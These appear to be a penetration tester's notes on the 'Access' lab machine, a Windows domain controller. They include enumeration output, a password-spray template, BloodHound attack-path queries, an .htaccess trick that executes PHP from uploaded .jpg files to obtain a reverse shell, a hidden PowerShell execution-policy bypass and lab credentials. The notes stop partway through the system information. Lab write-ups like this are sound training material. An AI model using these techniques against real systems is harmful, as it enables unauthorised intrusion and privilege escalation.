**Metadata**

- IP Address:  192.168.240.187
- Hostname: Access
- Domain: Offsec
- OS: Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec)
- Found Credentials/Users:
	- svc_myssql / trustno1

Main Objectives:

Local.txt = 
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```

The below commands will run as part of pg_recon.sh or you can run manually. 

[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.240.187 -oN - 
# Nmap 7.95 scan initiated Tue Feb  3 13:34:48 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.240.187
Nmap scan report for 192.168.240.187
Host is up (0.081s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.240.187 -oN /home/kali/ProvingGround/Access/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Access/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 13:34 MST
Nmap scan report for 192.168.240.187
Host is up (0.079s latency).
Not shown: 63297 closed tcp ports (reset), 2213 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-03 20:35:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC

```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 53, 80, 88, 135, 139, 389, 443, 445, 464, 593, 636, 3269, 5985, 9389, 47001, 49664, 49665, 49666, 49668, 49669, 49670, 49673, 49678, 49691, 49719
[+] Open UDP ports (open only): <none>

```

4. Web Enumeration 

```
Webserver Info - 80/tcp Apache httpd 2.4.48 ((Win64) 
|_http-server-header: Apache/2.4.48 (Win64) 
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event

Running Applications - OpenSSL/1.1.1k PHP/8.0.7

whatweb http://192.168.240.187   
http://192.168.240.187 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.240.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event]

Site Visit 
- Looks like a site to purchase tickets.
- The workflow for purchasing tickets allows for file uploads.
- Uploads can be viewed/accessed http://192.166.240.187/uploads

[+] Directory search BASIC on HTTP ports: 80,443,593,5985,47001,49669
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.240.187:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Access/gobuster/Access_192.168.240.187_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.240.187:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 304]
/.htaccess            (Status: 403) [Size: 304]
/.htpasswd            (Status: 403) [Size: 304]
/assets               (Status: 301) [Size: 343] [--> http://192.168.240.187/assets/]
/aux                  (Status: 403) [Size: 304]
/cgi-bin/             (Status: 403) [Size: 304]
/com1                 (Status: 403) [Size: 304]
/com2                 (Status: 403) [Size: 304]
/com3                 (Status: 403) [Size: 304]
/con                  (Status: 403) [Size: 304]
/forms                (Status: 301) [Size: 342] [--> http://192.168.240.187/forms/]
/index.html           (Status: 200) [Size: 49680]
/examples             (Status: 503) [Size: 404]
/licenses             (Status: 403) [Size: 423]
/lpt1                 (Status: 403) [Size: 304]
/lpt2                 (Status: 403) [Size: 304]
/nul                  (Status: 403) [Size: 304]
/phpmyadmin           (Status: 403) [Size: 423]
/prn                  (Status: 403) [Size: 304]
/server-info          (Status: 403) [Size: 423]
/server-status        (Status: 403) [Size: 423]
/uploads              (Status: 301) [Size: 344] [--> http://192.168.240.187/uploads/]
/webalizer            (Status: 403) [Size: 423]

[+] Running: Gobuster BASIC (443)
[+] Command: gobuster dir -u https://192.168.240.187:443 -w /usr/share/wordlists/dirb/common.txt -t 50 -k -o /home/kali/ProvingGround/Access/gobuster/Access_192.168.240.187_443_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.240.187:443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 305]
/.htpasswd            (Status: 403) [Size: 305]
/.hta                 (Status: 403) [Size: 305]
/assets               (Status: 301) [Size: 345] [--> https://192.168.240.187/assets/]
/aux                  (Status: 403) [Size: 305]
/cgi-bin/             (Status: 403) [Size: 305]
/com3                 (Status: 403) [Size: 305]
/com1                 (Status: 403) [Size: 305]
/com2                 (Status: 403) [Size: 305]
/con                  (Status: 403) [Size: 305]
/forms                (Status: 301) [Size: 344] [--> https://192.168.240.187/forms/]
/index.html           (Status: 200) [Size: 49680]
/examples             (Status: 503) [Size: 405]
/licenses             (Status: 403) [Size: 424]
/lpt1                 (Status: 403) [Size: 305]
/lpt2                 (Status: 403) [Size: 305]
/nul                  (Status: 403) [Size: 305]
/phpmyadmin           (Status: 403) [Size: 424]
/prn                  (Status: 403) [Size: 305]
/server-info          (Status: 403) [Size: 424]
/server-status        (Status: 403) [Size: 424]
/uploads              (Status: 301) [Size: 346] [--> https://192.168.240.187/uploads/]
/webalizer            (Status: 403) [Size: 424]
Progress: 4495 / 4613 (97.44%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.240.187:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Access/gobuster/Access_192.168.240.187_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.240.187:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 304]
/uploads              (Status: 301) [Size: 344] [--> http://192.168.240.187/uploads/]
/assets               (Status: 301) [Size: 343] [--> http://192.168.240.187/assets/]
/forms                (Status: 301) [Size: 342] [--> http://192.168.240.187/forms/]
/examples             (Status: 503) [Size: 404]
/licenses             (Status: 403) [Size: 423]
/Forms                (Status: 301) [Size: 342] [--> http://192.168.240.187/Forms/]
/Assets               (Status: 301) [Size: 343] [--> http://192.168.240.187/Assets/]
/*checkout*           (Status: 403) [Size: 304]
/phpmyadmin           (Status: 403) [Size: 423]
/Uploads              (Status: 301) [Size: 344] [--> http://192.168.240.187/Uploads/]
/webalizer            (Status: 403) [Size: 423]
/*docroot*            (Status: 403) [Size: 304]
/*                    (Status: 403) [Size: 304]
/con                  (Status: 403) [Size: 304]
/**http%3a            (Status: 403) [Size: 304]
/*http%3A             (Status: 403) [Size: 304]
/FORMS                (Status: 301) [Size: 342] [--> http://192.168.240.187/FORMS/]
/aux                  (Status: 403) [Size: 304]
/**http%3A            (Status: 403) [Size: 304]
/**http%3A%2F%2Fwww   (Status: 403) [Size: 304]
/server-status        (Status: 403) [Size: 423]
/devinmoore*          (Status: 403) [Size: 304]
/200109*              (Status: 403) [Size: 304]
/*sa_                 (Status: 403) [Size: 304]
/*dc_                 (Status: 403) [Size: 304]
Progress: 220472 / 220558 (99.96%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished

[+] Running: Gobuster ADVANCED (443)
[+] Command: gobuster dir -u https://192.168.240.187:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o /home/kali/ProvingGround/Access/gobuster/Access_192.168.240.187_443_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.240.187:443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 403) [Size: 305]
/uploads              (Status: 301) [Size: 346] [--> https://192.168.240.187/uploads/]
/assets               (Status: 301) [Size: 345] [--> https://192.168.240.187/assets/]
/forms                (Status: 301) [Size: 344] [--> https://192.168.240.187/forms/]
/examples             (Status: 503) [Size: 405]
/licenses             (Status: 403) [Size: 424]
/Forms                (Status: 301) [Size: 344] [--> https://192.168.240.187/Forms/]
/Assets               (Status: 301) [Size: 345] [--> https://192.168.240.187/Assets/]
/*checkout*           (Status: 403) [Size: 305]
/phpmyadmin           (Status: 403) [Size: 424]
/Uploads              (Status: 301) [Size: 346] [--> https://192.168.240.187/Uploads/]
/webalizer            (Status: 403) [Size: 424]
/*docroot*            (Status: 403) [Size: 305]
/*                    (Status: 403) [Size: 305]
/con                  (Status: 403) [Size: 305]
/**http%3a            (Status: 403) [Size: 305]
/*http%3A             (Status: 403) [Size: 305]
/FORMS                (Status: 301) [Size: 344] [--> https://192.168.240.187/FORMS/]
/aux                  (Status: 403) [Size: 305]
/**http%3A            (Status: 403) [Size: 305]
/**http%3A%2F%2Fwww   (Status: 403) [Size: 305]
/server-status        (Status: 403) [Size: 424]
/devinmoore*          (Status: 403) [Size: 305]
/200109*              (Status: 403) [Size: 305]
/*sa_                 (Status: 403) [Size: 305]
/*dc_                 (Status: 403) [Size: 305]
Progress: 220385 / 220558 (99.92%)
Progress: 220558 / 220558 (100.00%)===============================================================
Finished
==========

[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.240.187:80 -output /home/kali/ProvingGround/Access/web/192.168.240.187_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.240.187
+ Target Hostname:    192.168.240.187
+ Target Port:        80
+ Start Time:         2026-02-03 14:57:01 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ OpenSSL/1.1.1k appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ PHP/8.0.7 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.48 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /ticket.php?id=99999: Retrieved x-powered-by header: PHP/8.0.7.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8908 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2026-02-03 15:09:14 (GMT-7) (733 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
[+] Running: Nikto (443)
[+] Command: nikto -h https://192.168.240.187:443 -output /home/kali/ProvingGround/Access/web/192.168.240.187_443/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.240.187
+ Target Hostname:    192.168.240.187
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=localhost
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /CN=localhost
+ Start Time:         2026-02-03 15:09:15 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ OpenSSL/1.1.1k appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ PHP/8.0.7 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.48 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ Hostname '192.168.240.187' does not match certificate's names: localhost. See: https://cwe.mitre.org/data/definitions/297.html
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /ticket.php?id=99999: Retrieved x-powered-by header: PHP/8.0.7.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8909 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2026-02-03 15:59:47 (GMT-7) (3032 seconds)



```

5. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.240.187 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbmap -H 192.168.240.187                  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Something weird happened on (192.168.240.187) Error occurs while reading from remote(104) on line 1015                   
[*] Closed 1 connections                       

nxc smb 192.168.240.187 -u '' -p ''
SMB         192.168.240.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.240.187 445    SERVER           [-] access.offsec\: STATUS_ACCESS_DENIED 

nxc smb 192.168.240.187 -u '' -p '' --generate-hosts-file /tmp/hosts
SMB         192.168.240.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.240.187 445    SERVER           [-] access.offsec\: STATUS_ACCESS_DENIED 

nxc smb 192.168.240.187 -u 'guest' -p ''
SMB         192.168.240.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.240.187 445    SERVER           [-] access.offsec\guest: STATUS_ACCOUNT_DISABLED 

nxc smb 192.168.240.187 -u '' -p '' --rid-brute
SMB         192.168.240.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.240.187 445    SERVER           [-] access.offsec\: STATUS_ACCESS_DENIED 
SMB         192.168.240.187 445    SERVER           [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

nxc smb 192.168.240.187 -u users.txt -p <pass> -d <domain> --continue-on-success
# Password Spraying

```

6. LDAP Port 389, 3268 Enumeration

```
ldapsearch -x -H LDAP://192.168.240.187 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=access,DC=offsec
ldapServiceName: access.offsec:server$@ACCESS.OFFSEC
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=access,DC=offsec
serverName: CN=SERVER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Config
 uration,DC=access,DC=offsec
schemaNamingContext: CN=Schema,CN=Configuration,DC=access,DC=offsec
namingContexts: DC=access,DC=offsec
namingContexts: CN=Configuration,DC=access,DC=offsec
namingContexts: CN=Schema,CN=Configuration,DC=access,DC=offsec
namingContexts: DC=DomainDnsZones,DC=access,DC=offsec
namingContexts: DC=ForestDnsZones,DC=access,DC=offsec
isSynchronized: TRUE
highestCommittedUSN: 94276
dsServiceName: CN=NTDS Settings,CN=SERVER,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=access,DC=offsec
dnsHostName: SERVER.access.offsec
defaultNamingContext: DC=access,DC=offsec
currentTime: 20260203211123.0Z
configurationNamingContext: CN=Configuration,DC=access,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

nxc ldap 192.168.240.187 -u '' -p '' --users
LDAP        192.168.240.187 389    SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:access.offsec)
LDAP        192.168.240.187 389    SERVER           [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        192.168.240.187 389    SERVER           [+] access.offsec\: 
LDAP        192.168.240.187 389    SERVER           [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563

nxc ldap 192.168.240.187 -u '' -p '' --groups

LDAP        192.168.240.187 389    SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:access.offsec)
LDAP        192.168.240.187 389    SERVER           [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAP        192.168.240.187 389    SERVER           [+] access.offsec\: 
LDAP        192.168.240.187 389    SERVER           [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563

bloodhound-ce-python -d hutch.offsec -u '<username>' -p '<password>' -ns
192.168.50.122 -c all --zip
# Bloodhound Data Collection
```

7. Bloodhound Queries 

```

MATCH (u:User)
WHERE u.dontreqpreauth = true
AND u.enabled = true
RETURN u
LIMIT 100
# ASPREP Roastable Users

MATCH (u:User)
WHERE u.hasspn=true
AND u.enabled = true
AND NOT u.objectid ENDS WITH '-502'
AND NOT COALESCE(u.gmsa, false) = true
NOT COALESCE(u.msa, false) = true
RETURN u
LIMIT 100
# All Kerberoastable Users

MATCH p=shortestPath((t:Group)<-[:AD_ATTACK_PATHS*1..]-(s:Base))
WHERE t.objectid ENDS WITH '-512' AND s<>t
RETURN p
LIMIT 1000
# Shortest Paths To Domain Admins

MATCH p=shortestPath((s:Base)-[:AD_ATTACK_PATHS*1..]->(t:Base))
WHERE ((s:Tag_Owned) OR COALESCE(s.system_tags, '') CONTAINS 'owned')
AND s<>t
RETURN p
LIMIT 1000
# Shortest Paths From Owned Objects


```

8. Possible Exploits

```
- Buy tickets upload at http://192.168.240.187/index.html.

```

9. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps
- After trying multiple attempts to upload different types of php files, realized that a bypass was needed. 
- Found a hint that the .htaccess file might be writable or over writable to allow php execution via another execution like .jpg. 
- Created .htaccess file
```
AddType application/x-httpd-php .jpg
```

- Uploaded .htaccess file.
![[Pasted image 20260205131324.png]]
![[Pasted image 20260205131359.png]]

- Created reverse shell in file name shell.jpg
![[Pasted image 20260205131559.png]]

- Uploaded shell.jpg
![[Pasted image 20260205131930.png]]
![[Pasted image 20260205132001.png]]

- Setup reverse shell.
![[Pasted image 20260205131740.png]]

- Executed shell.jpg by visiting uploads directory. 
![[Pasted image 20260205132709.png]]

- Received shell as svc_apache
![[Pasted image 20260205133000.png]]


2. Shell Access

```

```

**Post-Exploitation**

1. Shell / Context (reference)

```

# Powershell

powershell -NoP -NonI -W Hidden -Exec Bypass

set-alias wget Invoke-WebRequest

set-alias curl Invoke-WebRequest

```
  
2. Identity & System Info

```
[+] whoami
$ whoami
access\svc_apache

[+] whoami /all
$ whoami /all

USER INFORMATION
----------------

User Name         SID                                         
================= ============================================
access\svc_apache S-1-5-21-537427935-490066102-1511301751-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

[+] hostname
$ hostname
SERVER

[+] systeminfo
$ systeminfo

Host Name:                 SERVER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-70000-00000-AA001
Original Install Date:     5/28/2021, 2:52:51 AM
System Boot Time:          3/5/2025, 11:15:17 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 396 MB
Virtual Memory: Max Size:  2,673 MB
Virtual Memory: Available: 787 MB
Virtual Memory: In Use:    1,886 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    access.offsec
Logon Server:              N/A
Hotfix(s):                 13 Hotfix(s) Installed.
                           [01]: KB5009472
                           [02]: KB4512577
                           [03]: KB4535680
                           [04]: KB4577586
                           [05]: KB4589208
                           [06]: KB5003243
                           [07]: KB5003711
